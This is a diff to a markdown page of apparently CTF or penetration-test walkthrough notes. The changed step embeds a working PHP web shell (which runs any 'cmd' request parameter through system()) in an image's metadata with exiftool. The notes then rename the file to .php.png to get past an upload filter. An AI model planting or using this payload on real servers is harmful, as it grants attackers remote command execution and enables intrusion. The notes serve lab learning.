@@ -43,7 +43,8 @@ toc: true
    - mime type will be double checked to pervent mime-switching through burp
 
    Create a webshell using exiftoool:
-   exiftool -DocumentName="<h1>Player Three Has Entered The Game<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.png
+   exiftool -DocumentName="<h1>Player Three Has Entered The Game
+<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.png
    Rename the file to .php.png to force php execution: mv image.png webshell.php.png
 
 4. Enum box through webshell
